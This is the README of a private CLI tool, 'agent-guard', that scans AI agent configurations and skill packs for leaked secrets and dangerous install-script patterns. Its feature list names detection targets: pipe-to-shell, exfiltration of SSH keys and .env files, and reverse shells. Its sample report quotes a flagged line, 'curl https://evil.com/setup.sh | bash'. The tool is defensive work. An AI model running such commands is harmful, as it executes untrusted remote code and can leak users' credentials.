# agent-guard

**PRIVATE REPOSITORY - DO NOT PUBLISH**

CLI tool to scan AI agent configurations for security risks and secrets. Designed for developers to audit skill packs, agent configs, and installation scripts before use.

## Features

### 1. Secret Scanner
Detects leaked credentials in agent configurations:
- API keys (OpenAI, Anthropic, GitHub, AWS, Slack, Google, Stripe)
- Tokens and bearer credentials
- Private keys (SSH, TLS)
- High-entropy strings (potential unrecognized secrets)

### 2. Risk Scanner
Identifies dangerous patterns in install scripts and hooks:
- Remote code execution (`curl|sh`, `wget|sh`)
- Data exfiltration (SSH keys, `.claude`, `.cursor`, `.env` files)
- Obfuscated payloads (base64, hex encoding)
- Network callbacks in installation hooks
- Reverse shells and suspicious file operations

### 3. Agent Config Checker
Analyzes Claude Code and Codex configurations:
- Helpers/subagents/reviewers without explicit models
- Cost drivers (model switching, expensive models, large contexts)
- Cursor hooks that fail open (`failClosed: false`)
- User-level hooks (incompatible with cloud agents)
- Test commands for validating hook behavior

## Installation

```bash
npm install
npm run build
```

## Usage

### Scan a directory
```bash
npm run dev /path/to/agent-config
```

### Scan with verbose output
```bash
npm run dev /path/to/skill-pack --verbose
```

### JSON output (for CI/CD integration)
```bash
npm run dev /path/to/.cursor --json
```

### Use compiled binary
```bash
npm run build
./dist/cli.js /path/to/scan
```

## Exit Codes

- `0`: No high-severity issues found
- `1`: High-severity issues detected (use in CI to gate deployment)

## Example Output

```
Agent Guard Security Scan Report

Scanned: 15 files in 3 directories

Summary:
  High:    3 finding(s)
  Medium:  5 finding(s)
  Info:    2 finding(s)

/path/to/.env:
  ✖ HIGH :12
    OpenAI API Key detected
    Matched pattern: sk-1234567890...
    Rule: openai-api-key

/path/to/install.sh:
  ✖ HIGH :45
    Curl pipe to shell: Dangerous curl|sh pattern that can execute arbitrary code
    Matched: curl https://evil.com/setup.sh | bash
    Rule: curl-pipe-to-shell

⚠ High severity issues found. Please review and remediate before deployment.
```

## Testing

```bash
npm test
```

Test fixtures are in `tests/fixtures/`:
- `secrets/` - Files with fake API keys and secrets
- `risks/` - Malicious scripts (fake, for testing)
- `configs/` - Agent configurations with various issues
- `clean/` - Valid configurations (should pass)

## Rules Documentation

See [RULES.md](./RULES.md) for detailed information about:
- All detection rules and patterns
- Severity levels and justifications
- Documentation sources for each rule
- Verification methodology

## Target Directories

Common paths to scan:
- `~/.claude/` - Claude Code configuration
- `~/.cursor/` - Cursor IDE configuration
- `.agents/skills/` - Agent skill packs
- `.codex/` - Codex configuration
- Downloaded skill packs before installation
- MCP server configurations

## Use Cases

### Before Installing Skills
```bash
agent-guard ~/Downloads/new-skill-pack/
```

### CI/CD Integration
```bash
# In GitHub Actions or similar
agent-guard .cursor/ --json > scan-results.json
if [ $? -ne 0 ]; then
  echo "Security issues found!"
  exit 1
fi
```

### Pre-commit Hook
```bash
#!/bin/bash
agent-guard .agents/ || exit 1
```

### Audit Existing Configurations
```bash
agent-guard ~/.claude/ --verbose
agent-guard ~/.cursor/ --verbose
```

## Context

This tool addresses recent security incidents:
- Malicious npm packages stealing `.claude` and `.cursor` configs
- Skill packs with embedded exfiltration scripts
- Installation hooks that download and execute remote code
- Obfuscated payloads in agent configurations

## Security Notes

- **Keep this tool private** - Detection patterns could help attackers evade detection
- All test fixtures use fake secrets only
- The tool runs entirely offline (no network calls)
- Scan results may contain sensitive information - handle carefully

## License

ISC (Private repository)
